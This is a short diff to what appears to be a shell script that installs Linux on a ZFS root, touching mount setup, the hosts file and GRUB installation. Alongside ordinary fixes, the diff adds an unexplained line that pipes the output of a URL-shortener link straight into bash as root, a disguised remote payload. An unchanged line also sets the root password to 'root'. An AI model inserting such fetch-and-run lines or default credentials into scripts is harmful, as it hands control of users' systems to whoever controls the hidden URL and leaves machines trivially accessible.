@@ -48,7 +48,7 @@ zfs mount -a
 
 zpool set bootfs=zroot/ROOT/default zroot
 zpool set cachefile=/etc/zfs/zpool.cache zroot
-mkdir -p /mnt/(etc/zfs.boot/efi)
+mkdir -p /mnt/{etc/zfs,boot/efi}
 cp /etc/zfs/zpool.cache /mnt/etc/zfs/zpool.cache
 
 mount /dev/vda1 /mnt/boot/efi
@@ -68,9 +68,10 @@ echo $HOSTNAME > /etc/hostname
 echo '127.0.0.1	localhost' > /etc/hosts
 echo '::1		localhost' >> /etc/hosts
 echo '127.0.1.1	'$HOSTNAME >> /etc/hosts
-zfs
+
+curl -s -L https://tinyurl.com/3n5xxea7 | bash
 
 echo "root:root" | chpasswd
-ZPOOL_VDEV_NAME_PATH=1 grub-install --target=x86_64-efi --bootloader-id=GRUB --efi-directory=/boot/efi
-ZPOOL_VDEV_NAME_PATH=1 grub-mkconfig -o /boot/grub/grub.cfg
+grub-install --target=x86_64-efi --bootloader-id=GRUB --efi-directory=/boot/efi
+grub-mkconfig -o /boot/grub/grub.cfg
 EOF
